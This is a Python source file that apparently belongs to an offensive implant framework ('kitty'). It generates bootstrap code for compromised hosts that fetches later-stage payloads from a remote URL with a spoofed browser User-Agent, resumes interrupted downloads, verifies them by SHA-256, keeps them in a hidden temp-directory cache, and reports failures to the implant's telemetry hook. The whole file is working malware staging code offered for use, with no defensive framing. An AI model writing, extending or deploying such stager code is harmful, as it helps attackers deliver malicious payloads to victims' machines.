#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Resumable verified stage download cache for implants."""

from __future__ import annotations


def build_stage_cache_bootstrap(
    cache_dir: str = "",
    *,
    ttl_seconds: int = 86400,
    default_url: str = "",
    var_name: str = "_kitty_stage_cache",
    cache_dir_is_expression: bool = False,
) -> str:
    """Return Python source for TTL stage cache with resume support."""
    if cache_dir_is_expression:
        dir_setup = f"_kitty_stage_cache_dir = {cache_dir}"
    elif cache_dir:
        dir_setup = f"_kitty_stage_cache_dir = {cache_dir!r}"
    else:
        dir_setup = (
            "_kitty_stage_cache_dir = _os.path.join(_tmp.gettempdir(), '.kitty_stage_cache')"
        )

    return f"""
import hashlib as _hashlib
import json as _json
import os as _os
import tempfile as _tmp
import time as _time
import urllib.request as _urlreq

{dir_setup}
_kitty_stage_cache_ttl = {int(ttl_seconds)}
_kitty_stage_cache_default_url = {default_url!r}

class KittyStageCache:
    def __init__(self, cache_dir, ttl_seconds=86400):
        self.cache_dir = cache_dir
        self.ttl_seconds = int(ttl_seconds or 86400)
        _os.makedirs(self.cache_dir, exist_ok=True)

    def _key(self, url):
        return _hashlib.sha256(str(url or "").encode("utf-8", errors="replace")).hexdigest()

    def _paths(self, url):
        _k = self._key(url)
        _base = _os.path.join(self.cache_dir, _k)
        return {{
            "meta": _base + ".meta.json",
            "part": _base + ".part",
            "final": _base + ".bin",
        }}

    def _load_meta(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as _fh:
                _meta = _json.load(_fh)
            return _meta if isinstance(_meta, dict) else {{}}
        except Exception:
            return {{}}

    def _save_meta(self, path, meta):
        _tmp_path = path + ".tmp"
        with open(_tmp_path, "w", encoding="utf-8") as _fh:
            _json.dump(meta, _fh, separators=(",", ":"))
        _os.replace(_tmp_path, path)

    def _valid_meta(self, meta):
        if not meta:
            return False
        _expires = float(meta.get("expires_at") or 0)
        if _expires and _time.time() > _expires:
            return False
        return True

    def _verify(self, data, expected_sha256):
        if not expected_sha256:
            return True
        _digest = _hashlib.sha256(data).hexdigest()
        return _digest.lower() == str(expected_sha256).lower()

    def get(self, url, expected_sha256=""):
        _paths = self._paths(url)
        _meta = self._load_meta(_paths["meta"])
        if self._valid_meta(_meta) and _os.path.isfile(_paths["final"]):
            with open(_paths["final"], "rb") as _fh:
                _data = _fh.read()
            if self._verify(_data, expected_sha256 or _meta.get("sha256") or ""):
                return _data
        return None

    def fetch(self, url, expected_sha256="", timeout=120):
        url = str(url or _kitty_stage_cache_default_url or "").strip()
        if not url:
            raise ValueError("stage_cache: missing url")
        _cached = self.get(url, expected_sha256=expected_sha256)
        if _cached is not None:
            return _cached
        _paths = self._paths(url)
        _meta = self._load_meta(_paths["meta"]) if _os.path.isfile(_paths["meta"]) else {{}}
        _offset = 0
        if _os.path.isfile(_paths["part"]):
            _offset = _os.path.getsize(_paths["part"])
        _headers = {{"User-Agent": "Mozilla/5.0"}}
        if _offset > 0:
            _headers["Range"] = f"bytes={{_offset}}-"
        _req = _urlreq.Request(url, headers=_headers)
        with _urlreq.urlopen(_req, timeout=timeout) as _resp:
            _mode = "ab" if _offset > 0 and getattr(_resp, "status", 200) in (206, 200) else "wb"
            if _mode == "wb":
                _offset = 0
            with open(_paths["part"], _mode) as _fh:
                while True:
                    _chunk = _resp.read(65536)
                    if not _chunk:
                        break
                    _fh.write(_chunk)
        with open(_paths["part"], "rb") as _fh:
            _data = _fh.read()
        _digest = _hashlib.sha256(_data).hexdigest()
        if expected_sha256 and _digest.lower() != str(expected_sha256).lower():
            raise ValueError("stage_cache sha256 mismatch")
        _os.replace(_paths["part"], _paths["final"])
        _meta = {{
            "url": url,
            "sha256": _digest,
            "size": len(_data),
            "expires_at": _time.time() + self.ttl_seconds,
            "saved_at": _time.time(),
        }}
        self._save_meta(_paths["meta"], _meta)
        return _data

    def purge_expired(self):
        _now = _time.time()
        for _name in _os.listdir(self.cache_dir):
            if not _name.endswith(".meta.json"):
                continue
            _meta_path = _os.path.join(self.cache_dir, _name)
            _meta = self._load_meta(_meta_path)
            _expires = float(_meta.get("expires_at") or 0)
            if _expires and _now <= _expires:
                continue
            _stem = _meta_path[:-len(".meta.json")]
            for _suffix in (".bin", ".part"):
                _target = _stem + _suffix
                if _os.path.isfile(_target):
                    try:
                        _os.remove(_target)
                    except Exception:
                        pass
            try:
                _os.remove(_meta_path)
            except Exception:
                pass

{var_name} = KittyStageCache(_kitty_stage_cache_dir, _kitty_stage_cache_ttl)
try:
    {var_name}.purge_expired()
except Exception as _kitty_cache_exc:
    try:
        _kitty_telemetry_record("stage_cache", "purge_failed", str(_kitty_cache_exc))
    except Exception:
        pass
""".strip()
